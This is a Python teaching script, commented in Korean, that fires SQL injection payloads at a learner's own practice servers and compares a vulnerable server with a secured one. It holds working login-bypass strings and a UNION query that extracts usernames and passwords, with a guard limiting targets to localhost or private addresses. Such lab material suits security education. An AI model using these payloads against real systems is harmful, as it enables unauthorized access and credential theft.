"""[공격 실습] SQL 인젝션을 직접 시도해 보는 도구.

안전장치: 127.0.0.1 / localhost 실습 서버에만 요청을 보낼 수 있습니다.
남의 서버에 쓰면 불법이에요. 이 도구는 '내가 만든 서버를 뚫어 보는' 연습용입니다.

사용법:
  python attack_sqli.py                  # 취약한 서버(8001)를 공격
  python attack_sqli.py --target secure  # 보안 서버(8002)에 같은 공격 → 막히는지 확인
"""
import argparse
import ipaddress
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"127.0.0.1", "localhost"}
TARGETS = {"vulnerable": 8001, "secure": 8002}

# 1) 로그인 우회: '--'는 SQL에서 "여기부터 뒤는 주석"이라는 뜻이에요.
LOGIN_PAYLOADS = [
    ("1) 비밀번호 없이 admin으로 들어가기 (뒷부분을 주석으로 잘라 버리기)",
     {"username": "admin' -- ", "password": "아무거나"}),
    ("2) '항상 참'인 조건을 넣어 아무 계정으로 들어가기",
     {"username": "' OR '1'='1", "password": "' OR '1'='1"}),
]

# 3), 4) 검색 창: 따옴표로 오류를 살펴보고, UNION으로 비밀번호를 빼내 보기
SEARCH_PAYLOADS = [
    ("3) 따옴표 하나만 넣어서 오류 모양 살펴보기", "'"),
    ("4) UNION으로 비밀번호 열을 같이 꺼내 보기",
     "' UNION SELECT username, password FROM users --"),
]


def check_local(base_url: str, allow_lan: bool = False) -> None:
    """기본: 내 컴퓨터(127.0.0.1)만 허용.
    --allow-lan: 같은 집 공유기 안의 사설 IP(192.168.x.x 등)만 추가 허용. 인터넷 주소는 항상 거부."""
    host = urllib.parse.urlparse(base_url).hostname or ""
    if host in ALLOWED_HOSTS:
        return
    if allow_lan:
        try:
            if ipaddress.ip_address(host).is_private:
                return
        except ValueError:
            pass
    sys.exit(
        "안전장치: 기본적으로 127.0.0.1 / localhost 실습 서버에만 보낼 수 있어요.\n"
        "두 대 실습이라면 --allow-lan 옵션과 함께 같은 와이파이의 사설 IP를 쓰세요."
    )


def send(base: str, method: str, path: str, data=None, params=None):
    """요청을 보내고 (상태 코드, 본문)을 돌려줍니다."""
    url = base + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    body = urllib.parse.urlencode(data).encode("utf-8") if data else None
    req = urllib.request.Request(url, data=body, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def show(title: str, status: int, body: str) -> None:
    print(f"\n{title}")
    print(f"  → 상태 코드: {status}")
    for line in body.strip().splitlines()[:6]:
        print(f"    {line[:160]}")


def main() -> None:
    parser = argparse.ArgumentParser(description="SQL 인젝션 실습 (내 실습 서버 전용)")
    parser.add_argument("--target", choices=TARGETS.keys(), default="vulnerable")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--allow-lan", action="store_true",
                        help="같은 집 와이파이의 다른 컴퓨터(사설 IP)를 대상으로 허용")
    args = parser.parse_args()

    base = f"http://{args.host}:{TARGETS[args.target]}"
    check_local(base, allow_lan=args.allow_lan)
    print(f"🎯 대상: {base}  ({args.target} 서버)")

    print("\n===== 로그인 공격 =====")
    for title, data in LOGIN_PAYLOADS:
        status, body = send(base, "POST", "/login", data=data)
        show(title, status, body)

    print("\n===== 검색 공격 =====")
    for title, q in SEARCH_PAYLOADS:
        status, body = send(base, "GET", "/search", params={"q": q})
        show(title, status, body)

    print("\n다 끝났어요. 결과가 '뚫림'이었는지 '막힘'이었는지 적어 보세요!")


if __name__ == "__main__":
    main()
